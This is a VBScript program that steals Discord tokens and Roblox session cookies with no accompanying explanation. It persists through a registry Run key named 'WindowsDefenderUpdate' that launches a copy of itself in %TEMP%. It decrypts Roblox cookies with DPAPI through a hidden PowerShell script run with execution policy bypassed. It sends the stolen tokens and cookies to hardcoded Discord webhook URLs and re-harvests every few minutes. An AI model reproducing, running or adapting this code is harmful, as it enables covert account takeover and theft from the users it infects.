Dim sh, fso, WH_LOGS, WH_REGRAB, WH_ONLINE, PC, USER, cookiePath, lastCookie, isFirstRun
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

WH_LOGS   = "https://discord.com/api/webhooks/1563118302715322368/9xgemSM8Sf-T3QMCNppQ10zpxz0CMjaGohxFCg6Hl8R0cVYB-ELK49meQbAfAtvS65Mt"
WH_REGRAB = "https://discord.com/api/webhooks/1563321942797455460/9VXQBvrcfwAk15eHsIy3B4i7B2AmU3N90UdnIAUP_ZM9sgrakO1jfjgPcbu1SJwzH9S_"
WH_ONLINE = "https://discord.com/api/webhooks/1563322005359689802/j8YrC7L0NiTS0Xr0EenAjLTUdEpn-GY0CMauHvjr877IA6JXsbd9kYpbUTGPkYMDJVda"

PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")
isFirstRun = True

On Error Resume Next
Dim selfPath: selfPath = WScript.ScriptFullName
Dim tempPath: tempPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\wdu.vbs"

' 1. Copy to Temp and setup registry IN THE BACKGROUND so it doesn't block the first grab
If LCase(selfPath) <> LCase(tempPath) Then
    fso.CopyFile selfPath, tempPath, True
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdate", "wscript.exe //B """ & tempPath & """", "REG_SZ"
    sh.Run "wscript.exe //B """ & tempPath & """", 0, False
    Call GrabTokens
End If
On Error Goto 0

' 2. Ping Online
SendWebhook WH_ONLINE, "{""embeds"":[{""title"":""User Online"",""description"":""Client: " & PC & " / " & USER & """,""color"":65280}]}"

' 3. GRAB INSTANTLY
Call GrabRoblox
isFirstRun = False

' 4. Keep looping for regrabs
lastCookie = ""
Do
    WScript.Sleep 150000 ' 2.5 minutes
    Call GrabRoblox
Loop

Sub GrabRoblox()
    cookiePath = FindCookiePath()
    If Len(cookiePath) = 0 Then Exit Sub
    
    Dim raw: raw = ReadFile(cookiePath)
    If Len(raw) < 50 Then Exit Sub
    
    Dim cookie: cookie = ExtractCookie(raw)
    If Len(cookie) = 0 Then Exit Sub
    
    If cookie <> lastCookie Then
        lastCookie = cookie
        Dim t: t = FormatDateTime(Now, 3)
        
        Dim destWH
        If isFirstRun Then
            destWH = WH_LOGS
        Else
            destWH = WH_REGRAB
        End If
        
        Dim embed: embed = "{""content"":""@everyone"",""embeds"":[{""title"":""Roblox Cookie Grabbed"",""description"":""``````" & cookie & "``````"",""color"":65280,""footer"":{""text"":""Roblox Tracker • Grabbed at " & t & """}}]}"
        
        SendWebhook destWH, embed
        Call PostFile("cookie.txt", cookie)
    End If
End Sub

Sub GrabTokens()
    Dim paths, i, file, content, matches, m
    paths = Array( _
        sh.ExpandEnvironmentStrings("%APPDATA%") & "\discord\Local Storage\leveldb", _
        sh.ExpandEnvironmentStrings("%APPDATA%") & "\discordcanary\Local Storage\leveldb", _
        sh.ExpandEnvironmentStrings("%APPDATA%") & "\discordptb\Local Storage\leveldb", _
        sh.ExpandEnvironmentStrings("%APPDATA%") & "\Lightcord\Local Storage\leveldb" _
    )
    
    Dim regex: Set regex = New RegExp
    regex.Pattern = "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
    regex.Global = True
    
    For i = 0 To UBound(paths)
        If fso.FolderExists(paths(i)) Then
            For Each file In fso.GetFolder(paths(i)).Files
                If LCase(Right(file.Name, 3)) = "ldb" Or LCase(Right(file.Name, 3)) = "log" Then
                    content = ReadFile(file.Path)
                    Set matches = regex.Execute(content)
                    For Each m In matches
                        SendWebhook WH_LOGS, "{""content"":""Discord Token Found (" & file.Name & "):\n" & m.Value & """}"
                    Next
                End If
            Next
        End If
    Next
End Sub

Function FindCookiePath()
    Dim paths, i, pk, folder, subf, uwp
    paths = Array( _
        sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat", _
        sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat", _
        sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat", _
        sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies" _
    )
    FindCookiePath = ""
    For i = 0 To 3
        If fso.FileExists(paths(i)) Then 
            FindCookiePath = paths(i)
            Exit Function
        End If
    Next
    
    pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
    If fso.FolderExists(pk) Then
        Set folder = fso.GetFolder(pk)
        For Each subf In folder.SubFolders
            If InStr(UCase(subf.Name), "ROBLOX") > 0 Then
                uwp = subf.Path & "\LocalState\RobloxCookies.dat"
                If fso.FileExists(uwp) Then 
                    FindCookiePath = uwp
                    Exit Function
                End If
            End If
        Next
    End If
End Function

Function ExtractCookie(raw)
    ExtractCookie = ""
    Dim m: m = InStr(raw, "_|WARNING")
    
    If m > 0 Then
        ExtractCookie = Mid(raw, m)
        Dim semi: semi = InStr(ExtractCookie, ";")
        If semi > 0 Then ExtractCookie = Left(ExtractCookie, semi - 1)
        Exit Function
    End If
    
    If InStr(raw, "CookiesData") > 0 Then
        Dim sp2: sp2 = InStr(raw, """CookiesData""")
        If sp2 > 0 Then
            Dim colon: colon = InStr(sp2, raw, ":")
            Dim q1: q1 = InStr(colon, raw, """")
            Dim q2: q2 = InStr(q1 + 1, raw, """")
            If q2 > q1 Then
                Dim b64: b64 = Mid(raw, q1 + 1, q2 - q1 - 1)
                If Len(b64) > 100 Then
                    Dim dec: dec = DecryptDPAPI(b64)
                    If Len(dec) > 0 Then
                        Dim dm: dm = InStr(dec, "_|WARNING")
                        If dm > 0 Then 
                            ExtractCookie = Mid(dec, dm)
                            Dim ds: ds = InStr(ExtractCookie, ";")
                            If ds > 0 Then ExtractCookie = Left(ExtractCookie, ds - 1)
                        Else
                            ExtractCookie = dec
                        End If
                    End If
                End If
            End If
        End If
    End If
End Function

Sub SendWebhook(url, json)
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.Open "POST", url, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send json
End Sub

Sub PostFile(fn, ct)
    Dim b: b = MkGuid()
    Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=""file""; filename=""" & fn & """" & vbCrLf & "Content-Type: text/plain" & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.Open "POST", WH_REGRAB, False
    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
    h.Send bd
End Sub

Function ReadFile(path)
    ReadFile = ""
    Dim f: Set f = fso.OpenTextFile(path, 1)
    ReadFile = f.ReadAll
    f.Close
End Function

Function DecryptDPAPI(b64)
    DecryptDPAPI = ""
    Dim inf: inf = sh.ExpandEnvironmentStrings("%TEMP%") & "\dpi.txt"
    Dim outf: outf = sh.ExpandEnvironmentStrings("%TEMP%") & "\dpo.txt"
    
    Dim f1: Set f1 = fso.CreateTextFile(inf, True)
    f1.Write b64
    f1.Close
    
    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
    Dim psf: psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\dp.ps1"
    
    Dim f2: Set f2 = fso.CreateTextFile(psf, True)
    f2.Write ps
    f2.Close
    
    sh.Run "powershell -NoProfile -ExecutionPolicy Bypass -File """ & psf & """", 0, True
    
    If fso.FileExists(outf) Then 
        Dim f3: Set f3 = fso.OpenTextFile(outf, 1)
        DecryptDPAPI = f3.ReadAll
        f3.Close
    End If
    
    fso.DeleteFile inf, True
    fso.DeleteFile psf, True
    fso.DeleteFile outf, True
End Function

Function MkGuid()
    Dim t: Set t = CreateObject("Scriptlet.TypeLib")
    MkGuid = Mid(t.GUID, 2, 36)
End Function
